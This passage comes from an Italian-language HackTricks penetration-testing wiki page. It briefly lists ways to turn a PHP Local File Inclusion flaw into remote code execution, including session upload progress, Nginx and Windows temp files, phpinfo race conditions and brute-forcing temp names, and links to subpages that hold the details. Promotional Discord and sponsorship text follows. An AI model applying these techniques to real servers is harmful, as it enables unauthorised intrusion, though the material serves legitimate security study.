**Carica** un file che verr√† memorizzato come **temporaneo** in `/tmp`, quindi nella **stessa richiesta**, provoca un **segmentation fault**, e quindi il **file temporaneo non verr√† eliminato** e puoi cercarlo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Attraverso l'archiviazione temporanea dei file di Nginx

Se hai trovato un **Local File Inclusion** e **Nginx** √® in esecuzione di fronte a PHP, potresti essere in grado di ottenere RCE con la seguente tecnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Attraverso PHP\_SESSION\_UPLOAD\_PROGRESS

Se hai trovato un **Local File Inclusion** anche se **non hai una sessione** e `session.auto_start` √® `Off`. Se fornisci **`PHP_SESSION_UPLOAD_PROGRESS`** nei dati **multipart POST**, PHP **abilita la sessione per te**. Puoi sfruttare questo per ottenere RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Attraverso il caricamento di file temporanei in Windows

Se hai trovato un **Local File Inclusion** e il server √® in esecuzione su **Windows**, potresti ottenere RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Attraverso phpinfo() (file\_uploads = on)

Se hai trovato un **Local File Inclusion** e un file che espone **phpinfo()** con file\_uploads = on, puoi ottenere RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Attraverso compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Divulgazione del percorso

Se hai trovato un **Local File Inclusion** e **puoi estrarre il percorso** del file temporaneo MA il **server** sta **controllando** se il **file da includere ha marcatori PHP**, puoi provare a **bypassare tale controllo** con questa **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Attraverso l'attesa eterna + forza bruta

Se puoi sfruttare LFI per **caricare file temporanei** e far **bloccare** l'esecuzione di PHP sul server, potresti quindi **forzare i nomi dei file per ore** per trovare il file temporaneo:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Per errore fatale

Se includi uno dei file `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Devi includere lo stesso due volte per generare quell'errore).

**Non so a cosa possa servire, ma potrebbe essere utile.**\
_Anche se si verifica un errore fatale di PHP, i file temporanei di PHP caricati vengono eliminati._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Riferimenti

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug!

**Hacking Insights**\
Interagisci con contenuti che approfondiscono l'emozione e le sfide dell'hacking

**Notizie sull'hacking in tempo reale**\
Rimani aggiornato sul mondo dell'hacking frenetico attraverso notizie e approfondimenti in tempo reale

**Ultime notizie**\
Rimani informato sui nuovi bug bounty in arrivo e sugli aggiornamenti cruciali delle piattaforme

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **e inizia a collaborare con i migliori hacker oggi stesso!**

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
